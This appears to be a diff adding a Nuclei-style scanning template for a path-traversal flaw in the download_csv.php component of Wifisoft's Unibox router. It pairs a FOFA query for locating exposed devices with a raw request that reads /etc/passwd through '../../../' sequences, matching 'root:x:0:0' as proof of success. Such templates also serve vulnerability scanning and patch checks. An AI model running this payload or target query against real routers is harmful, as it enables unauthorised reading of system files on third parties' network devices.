@@ -1,0 +1,25 @@
+id: unibox-router-download_csv-lfi
+
+info:
+  name: "Unibox 路由器 download_csv.php 组件路径遍历漏洞"
+  author: 0dayPoc
+  severity: medium
+  description: |-
+    fofa: body="www.wifi-soft.com"
+          Unibox路由器是Wifisoft公司开发的智能接入控制设备，主要面向咖啡馆、餐厅、小型酒店等场景部署。该设备整合了计费与带宽管理功能，支持有线/无线网络集中管控，并具备访问控制与网络活动监控能力。
+  tags: Unibox
+
+http:
+- raw:
+  - |
+    GET /tools/download_csv.php?download_file=../../../etc/passwd HTTP/1.1
+    Host: {{Hostname}}
+    Accept: */*
+  matchers-condition: and
+  matchers:
+  - type: status
+    status: [200]
+  - type: word
+    part: body
+    words:
+    - 'root:x:0:0'
